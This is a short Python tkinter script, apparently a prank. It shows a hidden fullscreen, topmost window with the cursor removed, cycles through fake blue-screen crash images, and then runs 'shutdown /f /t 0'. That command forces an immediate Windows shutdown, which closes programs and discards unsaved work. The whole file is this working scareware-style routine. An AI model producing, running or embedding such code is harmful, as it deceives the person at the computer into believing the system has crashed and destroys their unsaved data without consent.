from tkinter import Tk, Label, Button, Frame,PhotoImage
import time
import os
from random import randint

os.chdir(os.path.dirname(os.path.realpath(__file__)))

win = Tk()
win.attributes("-fullscreen", True)
win.config(bg="black")
win.attributes("-topmost", True)
win.withdraw()
win.config(cursor="none")

images = ['1bsod.png', '2bsod.png', '3bsod.png', '4bsod.png', '5bsod.png', '6bsod.png', '7bsod.png', '8bsod.png', '9bsod.png', '10bsod.png', '11bsod.png'] 
photos = []

loading_images = ["12bsod.png"]
loading_photos = []
#photo = PhotoImage(file=f"bsod/{images[0]}")

for path in images:
    p = PhotoImage(file=f"bsod/{path}")
    photos.append(p)

for path in loading_images: 
    p = PhotoImage(file=f"bsod/{path}")
    loading_photos.append(p)

label = Label(win, image=photos[0])
label.pack()

def bsod_fake():
    win.deiconify()
    time.sleep(0.1)
    for p in photos:
        label.config(image=p)
        win.update()
        win.update_idletasks()
        time.sleep(0.01)
    for p in loading_photos:
        time.sleep(randint(0,10))
        label.config(image=p)
        win.update()
        win.update_idletasks()
    time.sleep(4)
    os.system("shutdown /f /t 0")

if __name__ == "__main__":
    bsod_fake()

win.mainloop()